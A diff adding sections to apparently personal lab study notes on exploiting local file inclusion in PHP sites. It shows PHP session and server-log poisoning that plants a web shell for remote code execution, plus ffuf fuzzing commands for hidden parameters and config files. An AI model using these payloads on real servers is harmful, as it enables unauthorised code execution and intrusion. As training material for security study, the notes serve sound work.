@@ -313,3 +313,64 @@ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 And similarly include it:
 
 `http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`
+
+## Log poisoning
+
+This types of attacks rely on importing functions that have the `Execute` privileges. The main idea is that if we are aware of any info that is logged to a file, we can send our malicious payload so that it gets logged. Then, we'll import the poisoned log to be executed.
+
+## PHP Session poisoning
+
+Similar to log poisoning, session data is stored in files in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. E.g, if the PHPSESSIONID is `el4ukv0kqbvoirg7nkp4dncpk3`, the location in the disk will be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.
+
+`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`
+
+Now, we should look for some value in the session that is under our control. For example, `language`.
+
+We can write a URL-encoded web shell in language:
+
+`http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`.
+
+Then, when we visit the page with the session LFI, we'll get Remote Code Execution:
+
+`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`
+
+## Server log poisoning
+
+We can abuse Apache or Nginx access or error logs to inject some malicious PHP that will be imported with the LFI vulnerability.
+
+We can control the User-Agent of our client, therefore, we can send a request with User-Agent header with the web shell:
+
+```bash
+adriangalera@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+adriangalera@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+```
+
+The poisoning technique might be used for SSH, mail or ftp logs.
+
+We should determine first if we have access to the files using the LFI.
+
+## Fuzzing parameters
+
+Usually, the parameters in forms and such are well protected. However, there might be hidden parameters not well secured and vulnerable to LFI.
+
+Example with `fuff`:
+
+```bash
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'
+```
+
+We can find good wordlists for LFI seclists: Fuzzing/LFI and LFI-Jhaddix.
+
+We can use the LFI to discover the contents of the server, for example identifying the server root. For example:
+
+```bash
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' 
+```
+
+Depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.
+
+Same technique can be leveraged to find server configuration or logs. For example, these two wordlists https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux and https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows allows to reveal several configuration and log files.
+
+```bash
+ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ'
+```
